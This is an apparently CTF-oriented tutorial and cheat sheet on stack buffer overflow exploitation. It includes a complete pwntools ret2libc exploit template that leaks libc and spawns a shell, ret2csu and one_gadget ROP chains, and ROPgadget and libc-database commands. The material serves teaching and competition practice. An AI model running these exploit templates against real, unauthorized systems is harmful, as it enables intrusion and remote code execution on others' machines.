# Stack Exploitation (Stack Pwn)

## Trigger Conditions and Pre-Checks

### Reading checksec

```bash
checksec --file=./vuln
# or the pwntools built-in
python -c "from pwn import *; print(ELF('./vuln'))"
```

| Output Field | Impact | Countermeasure |
|---------|------|------|
| `NX disabled` | Stack is executable | Just stuff in shellcode |
| `Canary found` | Stack overflow will be detected | Must leak the canary first or bypass it (forked process / format string) |
| `PIE enabled` | .text base is randomized | Must leak a code address |
| `No PIE` | .text is fixed | Hardcode gadget addresses |
| `Full RELRO` | GOT is not writable | Cannot overwrite the GOT; go ret2libc / one_gadget |
| `Partial RELRO` | GOT is writable | The GOT can be overwritten |
| `FORTIFY` | Some libc functions are replaced with `_chk` versions | `read_chk` can still overflow, `strcpy_chk` cannot |

### Pinpointing the Exact Stack Overflow Offset

```python
# pwntools cyclic pattern
from pwn import *
context.arch = 'amd64'

# 1. Generate a cyclic pattern
payload = cyclic(200)

# 2. Feed it to the program to trigger the crash
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. Read the value at RSP from the core dump
core = p.corefile
fault = core.fault_addr  # or the 8 bytes pointed to by core.rsp
offset = cyclic_find(fault & 0xffffffff)  # 32-bit mode
# For 64-bit use cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### 32 / 64-bit Calling Convention Cheat Sheet

| Architecture | Argument Passing | Return | Notes |
|------|---------|------|------|
| x86 (32-bit) | stack-passed (cdecl: caller cleans up) | eax | stack layout: ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp must be 16-byte aligned at the call entry |
| ARM32 | r0-r3, stack | r0 | lr holds the return address; return with bx lr |
| ARM64 | x0-x7, stack | x0 | similar to SysV, stricter alignment |

## Complete ret2libc pwntools Template

```python
#!/usr/bin/env python3
from pwn import *

# === Environment setup ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# Auto-patchelf so the local binary uses the challenge-provided libc
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # measured via cyclic
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # for stack alignment

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # make puts print the puts@got address itself
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # return to main, reusing the stack overflow for a second round

p.sendlineafter(b'> ', payload)

# Receive the leak (anchor on a recvuntil string; do not use sleep)
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# Back-solve the libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # Key: restore 16-byte alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### Stack Alignment Pitfall (Must Read)

```text
Symptom: works locally, but remotely it SIGSEGVs the moment system is entered
Cause: libc's system → do_system → somewhere inside, a movaps xmm0, [rsp]
       requires rsp to be 16-byte aligned
Failure: when your ROP chain jumps into system, rsp ends in 0x8 instead of 0x0
Fix: insert a `ret` gadget into the ROP chain (burns 8 bytes and re-aligns rsp)
```

## ret2csu (Universal Gadget)

When the binary has no third-argument gadget such as `pop rdx; ret`, use the fixed structure inside `__libc_csu_init` (present in statically linked programs built against glibc < 2.34).

```text
Fixed pattern at the tail of __libc_csu_init:
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

A little earlier there is also:
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
    mov  edi, r13d ; r13 → rdi (low 32 bits)
    call qword ptr [r12 + rbx*8]
```

pwntools version:

```python
csu_pop = 0x40119a  # first segment (pop rbx..r15; ret)
csu_call = 0x401180  # second segment (mov rdx,r15; ... ; call [r12+rbx*8])

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1 (so the later cmp rbx,rbp passes → rbx+1 == rbp)
    p += p64(call_target)    # r12 = [r12+rbx*8] is dereferenced to reach the target
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # after the second segment's ret, 7 more values are popped
    return p
```

Use case: write a function pointer into bss, then call it with csu; commonly used to jump into bss and run ROP after a `read(0, bss, 0x100)` stage.

## one_gadget Usage

```bash
one_gadget ./libc.so.6

# Output looks like:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

Usage:

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # pick the one whose constraints can be satisfied
```

**Trap**: in some libc versions (2.34+), one_gadget constraints are extremely hard to satisfy; plain ret2libc is more dependable.

## libc-database Reverse Lookup

Scenario: the challenge gives no libc, so you can only infer the version from a few leaked function addresses.

```bash
cd ~/tools/libc-database

# Look up with the leaked puts and read addresses (last 3 hex digits)
./find puts 0x6f0 read 0xfd
# Output: libc6_2.31-0ubuntu9.9_amd64

# Fetch all symbol offsets of the matching libc
./dump libc6_2.31-0ubuntu9.9_amd64

# Download the actual libc.so.6 to disk
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

pwntools integration:

```python
# Online libc-database query (no local copy needed)
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget Cheat Sheet

```bash
# Basics: pop|ret single-register gadgets
ROPgadget --binary ./vuln --only "pop|ret"

# Find a syscall
ROPgadget --binary ./vuln | grep ': syscall'

# Find gadgets with specific bytes
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# Find a string
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# Emit JSON for scripted parsing
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper alternative (wider architecture support):

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## Remote Stabilization Checklist

| Problem | Symptom | Fix |
|------|------|------|
| Wrong libc version | Works locally, remote SIGSEGV in system | After leaking, use libc-database to identify the actual version |
| Stack alignment | system segfaults immediately | Add a `ret` gadget |
| Network latency | recv returns half a message | Use `recvuntil(b'anchor string')`, not `sleep` |
| Buffering | sendline sends but nothing happens | Switch to `sendlineafter`; explicitly wait for the prompt before sending |
| ASLR drift | Probabilistic success | Check whether it is a byte-level brute (1/16 odds is not stable) |
| TCP nagle | Small packets get coalesced | `p.settimeout(2); p.recvall(timeout=2)` as a safety net |

## Debugging Tips

```python
# pwntools built-in gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# Run under gdb from the very start
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

Common GEF/pwndbg commands:

```text
checksec               # show protections
vmmap                  # memory layout
telescope $rsp 30      # stack walk (pwndbg)
stack 30               # equivalent (GEF)
got                    # GOT table
search-pattern "/bin/sh"
context                # auto-shows regs + stack + code (on by default)
ropgadget              # built-in gadget search
```

## Caveats

- **NX off + ASLR off** are required to inject shellcode directly; modern binaries almost always have NX on
- **The canary stays the same in forked children** — a forking server lets you brute-force it byte by byte (1/256 × 7 bytes)
- **A format string can leak the canary and libc at the same time** — scan the stack with `%p %p ... %p`
- **DynELF is slow but universal** — when no libc is provided at all, pwntools' `DynELF` can leak the symbol table byte by byte using only the program's own IO primitives
- **Statically linked binaries have no libc.got** — use SROP (sigreturn-oriented programming) or direct syscalls
